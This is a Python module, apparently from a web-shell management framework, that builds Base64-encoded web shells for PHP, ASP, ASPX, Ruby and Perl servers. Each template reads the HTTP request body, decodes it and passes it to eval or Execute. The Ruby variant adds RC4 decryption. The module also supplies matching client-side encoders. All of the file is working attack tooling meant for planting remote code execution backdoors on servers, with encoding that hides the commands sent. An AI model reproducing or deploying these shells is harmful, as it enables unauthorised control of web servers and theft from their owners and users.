# obfuscators/BASE64.py

import base64
import json
import textwrap

PARAM_SCHEM = {
    "encoding" : "utf-8"
}

HELP = 'Obfuscate the payload with Base64.'

dicObfuscator = {
    'PHP' : textwrap.dedent('''
        function Encrypt($data) {
            return base64_encode($data);
        }
        ''').strip(),
    
    'ASP' : textwrap.dedent('''
        Function Encrypt(data)
            Dim xmlDoc, xmlNode
            Set xmlDoc = CreateObject("MSXML2.DOMDocument.3.0")
            Set xmlNode = xmlDoc.CreateElement("base64")
            xmlNode.dataType = "bin.base64"
            
            Dim stream
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 2 ' adTypeText
            stream.Charset = "utf-8"
            stream.Open
            stream.WriteText data
            stream.Position = 0
            stream.Type = 1 ' adTypeBinary
            
            xmlNode.nodeTypedValue = stream.Read
            Encrypt = Replace(xmlNode.text, vbLf, "")
        End Function
        ''').strip(),

    'ASPX' : textwrap.dedent('''
        function Encrypt(data : String) : String {
            var bytes = System.Text.Encoding.UTF8.GetBytes(data);
            return System.Convert.ToBase64String(bytes);
        }
        ''').strip(),

    'Ruby' : textwrap.dedent('''
        require 'base64'

        def Encrypt(data)
          Base64.strict_encode64(data)
        end
        ''').strip(),

    'Perl' : textwrap.dedent('''
        use MIME::Base64;

        sub Encrypt {
            my ($data) = @_;
            my $b64 = encode_base64($data, "");
            $b64 =~ s/\s+//g;
            return $b64;
        }
        ''').strip()
}

dicPayload = {
    'PHP' : textwrap.dedent('''
        <?php
        $rawInput = file_get_contents("php://input");
        $decrypted = base64_decode($rawInput);
        eval($decrypted);
        ?>
        ''').strip(),
    
    'ASP' : textwrap.dedent('''
        <%
        On Error Resume Next

        Dim byteCount, rawBytes, rawString
        byteCount = Request.TotalBytes
        if byteCount > 0 then
            rawBytes = Request.BinaryRead(byteCount)
            
            Dim stream
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 1 ' adTypeBinary
            stream.Open
            stream.Write rawBytes
            stream.Position = 0
            stream.Type = 2 ' adTypeText
            stream.Charset = "ascii"
            rawString = stream.ReadText
            stream.Close
            Set stream = Nothing

            Dim xmlDoc, node, plaintext
            Set xmlDoc = CreateObject("MSXML2.DOMDocument.3.0")
            Set node = xmlDoc.CreateElement("base64")
            node.dataType = "bin.base64"
            node.text = rawString
            
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 1 ' adTypeBinary
            stream.Open
            stream.Write node.nodeTypedValue
            stream.Position = 0
            stream.Type = 2 ' adTypeText
            stream.Charset = "utf-8"
            plaintext = stream.ReadText
            stream.Close
            Set stream = Nothing
            if plaintext <> "" then
                Execute(plaintext)
            end if
        end if
        %>
        ''').strip(),

    'ASPX' : textwrap.dedent('''
        <%@ Page Language="JScript" %>
        <%
        var inputStream = Request.InputStream;
        var len = inputStream.Length;
        var rawData : System.Byte[] = new System.Byte[len]; 
        inputStream.Read(rawData, 0, len);
        var b64String : String = System.Text.Encoding.ASCII.GetString(rawData);
        var decryptedBytes : System.Byte[] = System.Convert.FromBase64String(b64String);
        var plaintext : String = System.Text.Encoding.UTF8.GetString(decryptedBytes);
        eval(plaintext, "unsafe");
        %>
        ''').strip(),
        
    'Ruby' : textwrap.dedent('''
        require 'base64'

        def rc4_crypt(data, key)
            s = (0..255).to_a

            j = 0
            key_bytes = key.bytes
            key_length = key_bytes.length

            # KSA
            (0...256).each do |i|
                j = (j + s[i] + key_bytes[i % key_length]) % 256

                tmp = s[i]
                s[i] = s[j]
                s[j] = tmp
            end

            # PRGA
            i = 0
            j = 0
            out = []

            data.bytes.each do |byte|
                i = (i + 1) % 256
                j = (j + s[i]) % 256

                tmp = s[i]
                s[i] = s[j]
                s[j] = tmp

                t = (s[i] + s[j]) % 256

                out << (byte ^ s[t])
            end

            out.pack("C*")
        end


        begin
            len = ENV['CONTENT_LENGTH'].to_i

            raw_input = STDIN.read(len)

            raw_input = raw_input.gsub(' ', '+')

            unless raw_input.empty?

                key = "[RC4_KEY]"

                encrypted_bytes = Base64.decode64(raw_input)

                decrypted = rc4_crypt(
                    encrypted_bytes,
                    key
                )

                eval(decrypted)

            end

        rescue => e
            print "Content-Type: text/plain\\r\\n\\r\\n"
            print e.message
        end
        ''').strip(),

    'Perl' : textwrap.dedent('''
        use strict;
        use warnings;
        use MIME::Base64;

        my $len = $ENV{CONTENT_LENGTH} || 0;
        read(STDIN, my $body, $len);
        my $code = decode_base64($body);
        eval $code;
        ''').strip()
}

def help(payload, **kwargs):
    return HELP

def obfuscator(payload, script, key=None, **kwargs):
    if script in dicObfuscator.keys():
        return dicObfuscator[script]
    else:
        return ''

def build(payload, script, **kwargs):
    if script in dicPayload.keys():
        return dicPayload[script]
    else:
        return ''

def available(payload, **kwargs):
    scripts = []
    for script in dicPayload.keys():
        if not script in dicObfuscator.keys():
            continue

        scripts.append(script)

    return ','.join(scripts)

def example(payload, **kwargs):
    return json.dumps(PARAM_SCHEM, indent=4)

def obfuscate(payload, encoding='utf-8', **kwargs):
    payload_bytes = payload.encode(encoding) if isinstance(payload, str) else payload
    encoded_bytes = base64.b64encode(payload_bytes)
    return encoded_bytes.decode(encoding)

def deobfuscate(payload, encoding='utf-8', **kwargs):
    payload_bytes = payload.encode(encoding) if isinstance(payload, str) else payload
    decrypted_bytes = base64.b64decode(payload_bytes)
    return decrypted_bytes.decode(encoding)